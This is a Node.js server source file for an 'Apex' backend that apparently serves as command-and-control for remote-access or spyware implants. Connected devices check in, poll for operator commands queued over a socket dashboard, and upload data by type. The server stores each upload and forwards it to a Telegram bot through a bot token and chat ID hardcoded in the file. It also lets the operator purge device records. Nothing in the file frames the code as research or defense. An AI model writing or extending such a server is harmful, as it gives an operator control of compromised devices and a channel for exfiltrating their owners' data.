const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const compression = require('compression');
const fs = require('fs');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Security: Use Environment Variables
const BOT_TOKEN = process.env.BOT_TOKEN || '8934078128:AAFOvXShVBYJ3TJBT34eHg2QZ8ZGA_0F5_M';
const CHAT_ID = process.env.CHAT_ID || '6889335186';

app.use(compression());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// --- STATE MANAGEMENT ---
let activeDevices = {};
let pendingCommands = {};
let storedData = {}; // New: Store data for dashboard pull

if (fs.existsSync('devices.json')) {
    try {
        activeDevices = JSON.parse(fs.readFileSync('devices.json', 'utf8'));
        for (let id in activeDevices) activeDevices[id].status = 'Disconnected';
    } catch (e) { console.error("Error loading devices.json"); }
}

function saveDevices() {
    fs.writeFileSync('devices.json', JSON.stringify(activeDevices, null, 2));
}

async function notifyTelegram(deviceName, dataType, payload) {
    try {
        const message = `*Apex Alert*\n*Device:* ${deviceName}\n*Data:* ${dataType}\n\n${payload.substring(0, 1000)}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("Telegram Error:", e.message); }
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// --- API ENDPOINTS ---

app.get('/api/connect', (req, res) => {
    const deviceName = req.query.deviceName || 'Unknown';
    activeDevices[deviceName] = { deviceName, status: 'Connected', lastSeen: Date.now() };
    saveDevices();
    io.emit('device_status', activeDevices[deviceName]);
    res.status(200).send("OK");
});

app.get('/api/get-command', (req, res) => {
    const deviceName = req.query.deviceName;
    if (activeDevices[deviceName]) activeDevices[deviceName].lastSeen = Date.now();
    
    if (pendingCommands[deviceName]) {
        const cmd = pendingCommands[deviceName];
        delete pendingCommands[deviceName];
        return res.status(200).json({ command: cmd });
    }
    res.status(204).send();
});

// NEW: Endpoint for the dashboard to pull data
app.get('/api/fetch-stored-data', (req, res) => {
    const { deviceName, dataType } = req.query;
    if (storedData[deviceName] && storedData[deviceName][dataType]) {
        res.json({ data: storedData[deviceName][dataType] });
    } else {
        res.status(404).send("No data found");
    }
});

app.post('/api/sync-data', async (req, res) => {
    const { deviceName, dataType, payload } = req.body;
    
    // 1. Store data for dashboard pull
    if (!storedData[deviceName]) storedData[deviceName] = {};
    storedData[deviceName][dataType] = payload;

    // 2. Forward to Telegram
    await notifyTelegram(deviceName, dataType, payload);
    
    res.status(200).send("OK");
});

// --- SOCKETS & INTERVALS ---
io.on('connection', (socket) => {
    socket.emit('initial_state', activeDevices);
    socket.on('controller_command', (data) => {
        pendingCommands[data.targetDevice] = data.command;
    });
    socket.on('purge_device_record', (data) => {
        delete activeDevices[data.deviceName];
        delete storedData[data.deviceName]; // Clear stored data too
        saveDevices();
        io.emit('device_removed', data.deviceName);
    });
});

setInterval(() => {
    const now = Date.now();
    for (let id in activeDevices) {
        if (now - activeDevices[id].lastSeen > 120000 && activeDevices[id].status === 'Connected') {
            activeDevices[id].status = 'Disconnected';
            saveDevices();
            io.emit('device_status', activeDevices[id]);
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Apex Server running on port ${PORT}`));
